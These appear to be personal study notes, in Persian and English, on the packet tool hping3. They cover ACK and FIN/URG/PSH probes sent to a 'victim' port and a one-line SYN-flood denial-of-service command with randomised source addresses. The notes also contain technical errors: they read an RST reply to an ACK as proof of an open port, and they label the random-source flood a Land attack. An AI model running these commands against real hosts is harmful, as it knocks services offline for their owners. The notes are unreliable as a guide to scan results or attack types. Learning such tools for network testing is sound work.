$\color{#b91646}{\textsf{hping3}}$
==================================

### $\color{#25678D}{\textsf{hping3}}$

hping3 is a network tool able to send custom TCP/IP packets and to display target replies like ping program does with  ICMP  replies.  hping3 handle  fragmentation,  arbitrary packets body and size and can be used	in order to transfer  files  encapsulated  under  supported  protocols.

یک network tool است برای فرستادن packet های خاص TCP/IP -> توی پروتکل های UDP, ICMP و ... هم می تونه بفرسته.
_____________________
### $\color{#25678D}{\textsf{-1 normal ping}}$

نی تونه ping معمولی انجام بدیم. -> با استفاده از سوئیچ 1-

سوئیچ های زیادی داره.
______________________________
### $\color{#25678D}{\textsf{Create an ACK packet and send it to port 80 on the victim}}$
- **hping3 –A \<target IP address> -p 80** ->  Test with jadi.ir and yahoo.com

می تونیم برای اینکه تابلو نباشه داریم port چک می کنیم یهو ACK بفرستیم. -> با سوئیچ A- می تونیم پکت ACK بفرستیم.

اگر در جواب RST فرستاد می گه نفهمیدم چی گفتی => متوجه می شیم Port بازه.

اگر در جواب چیزی نفرستاد => متوجه می شیم که port بسته است یا یک stateful firewall سر راه است.
_______________
### $\color{#25678D}{\textsf{Create a packet with FIN, URG, and PSH flags set and send it to port 80 on the victim}}$
- **hping3 –F –P -U \<target IP address> -p 80**

_______________________
### $\color{#25678D}{\textsf{DOS Land Attack}}$
- **hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP
-c count, -d size, -S syn, -w winsize, -p port -s source port**

سوئیچ V- جزئیات بیشتری رو نشون میده.
